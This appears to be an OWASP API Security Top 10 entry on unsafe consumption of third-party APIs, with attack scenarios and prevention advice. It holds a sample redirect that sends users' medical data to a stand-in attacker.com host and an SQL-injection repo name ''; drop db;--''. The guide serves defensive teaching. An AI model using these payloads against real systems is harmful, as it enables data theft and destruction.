API10:2023 Unsafe Consumption of APIs
=====================================

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **2** | Prevalence **2** : Detectability **1** | Technical **3** : Business Specific |
| Developers often trust external or third-party APIs without proper verification, leaving their endpoints vulnerable to security flaws. | API integrations typically exhibit weaker security measures, such as transport security, authentication/authorization, and input validation and sanitization. | Common issues include unauthorized exposure of sensitive information and various types of injections. |

## Is the API Vulnerable?

Developers tend to trust data received from third-party APIs more than user
input. This is especially true for APIs offered by well-known companies.
Because of that, developers tend to adopt weaker security standards, for
instance, in regards to input validation and sanitization.

The API might be vulnerable if:

* Interacts with other APIs over an unencrypted channel;
* Does not properly validate and sanitize data gathered from other APIs prior
  to processing it or passing it to downstream components;
* Blindly follows redirections;
* Does not limit the number of resources available to process third-party
  services responses;
* Does not implement timeouts for interactions with third-party services;

## Example Attack Scenarios

### Scenario #1

An API relies on a third-party service to enrich user provided business
addresses. When an address is supplied to the API by the end user, it is sent
to the third-party service and the returned data is then stored on a local
SQL-enabled database.

Bad actors use the third-party service to store an SQLi payload associated with
a business created by them. Then they go after the vulnerable API providing
specific input that makes it pull their "malicious business" from the
third-party service. The SQLi payload ends up being executed by the database,
exfiltrating data to an attacker's controlled server.

### Scenario #2

An API integrates with a third-party service provider to safely store sensitive
user medical information. Data is sent over a secure connection using an HTTP
request like the one below:

```
POST /user/store_phr_record
{ "genome": "ACTAGTAG__TTGADDAAIICCTTâ€¦" }
```

Bad actors found a way to compromise the third-party API and it starts
responding with a 308 Permanent Redirect to requests like the previous one.

```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

Since the API blindly follows the third-party redirects, it will repeat the
exact same request including the user's sensitive data, but this time to the
attacker's server.

### Scenario #3

An attacker can prepare a git repo named `'; drop db;--`.

Now, when an integration from an attacked application is done with the
malicious repo, an injection payload is used on an application that builds an
SQL query believing the repo's name is safe input.

## How To Prevent

* When evaluating service providers, assess their API security posture.
* Ensure all API interactions happen over a secure communication channel (TLS).
* Always validate and properly sanitize data received from integrated APIs
  before using it.
* Maintain an allowlist of well-known locations integrated APIs may redirect
  yours to: do not blindly follow redirects.
